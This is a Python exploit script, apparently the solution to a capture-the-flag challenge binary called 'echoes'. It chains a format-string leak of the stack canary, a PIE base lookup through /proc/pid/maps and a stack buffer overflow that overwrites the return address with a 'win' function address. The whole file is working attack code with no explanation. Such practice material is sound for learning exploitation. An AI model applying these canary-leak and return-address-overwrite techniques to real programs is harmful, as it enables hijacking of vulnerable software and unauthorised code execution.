#!/usr/bin/env python3
"""Exploit script for the RAMADUNE // ECHO TERMINAL leaked locally."""

import os
import struct
import subprocess

from typing import BinaryIO

BINARY = "./echoes"
LEAK_COUNT = 24
WIN_OFFSET = 0x1310
FEEDBACK_SIZE = 400
BUFFER_PAD = 136


def read_binary_base(pid: int) -> int:
    with open(f"/proc/{pid}/maps", "r", encoding="ascii", errors="ignore") as maps:
        for line in maps:
            if "echoes" in line and "r-xp" in line:
                return int(line.split("-")[0], 16)
    raise RuntimeError("failed to resolve base address")


def read_until(stream: BinaryIO, marker: bytes) -> bytes:
    data = bytearray()
    while True:
        chunk = stream.readline()
        if not chunk:
            raise RuntimeError("unexpected EOF while waiting for %s" % marker.decode())
        data += chunk
        if marker in chunk:
            break
    return bytes(data)


def leak_canary(proc, stream: BinaryIO) -> int:
    fmt = b"LEAK"
    for i in range(LEAK_COUNT):
        fmt += b" %" + str(i + 1).encode() + b"$p"
    fmt += b"\n"

    proc.stdin.write(fmt)
    proc.stdin.flush()

    chunk = read_until(stream, b">> Send your final feedback packet:\n")
    for line in chunk.splitlines():
        if line.startswith(b"LEAK"):
            tokens = line.split()
            return int(tokens[-1], 16)

    raise RuntimeError("unable to parse canary")


def run() -> None:
    env = os.environ.copy()
    proc = subprocess.Popen(
        [BINARY],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        env=env,
        bufsize=0,
    )
    assert proc.stdin and proc.stdout

    read_until(proc.stdout, b">> Identify yourself:\n")
    read_until(proc.stdout, b">> Echoing signal...\n")

    canary = leak_canary(proc, proc.stdout)
    read_until(proc.stdout, b">> (packet size accepted: 400)\n")

    base = read_binary_base(proc.pid)
    win_addr = base + WIN_OFFSET

    payload = (b"A" * BUFFER_PAD)
    payload += struct.pack("<Q", canary)
    payload += b"B" * 8
    payload += struct.pack("<Q", win_addr)
    payload = payload.ljust(FEEDBACK_SIZE, b"C")

    proc.stdin.write(payload)
    proc.stdin.flush()
    proc.stdin.close()

    remaining = proc.stdout.read()
    print(remaining.decode(errors="ignore"))
    proc.stdout.close()


if __name__ == "__main__":
    run()
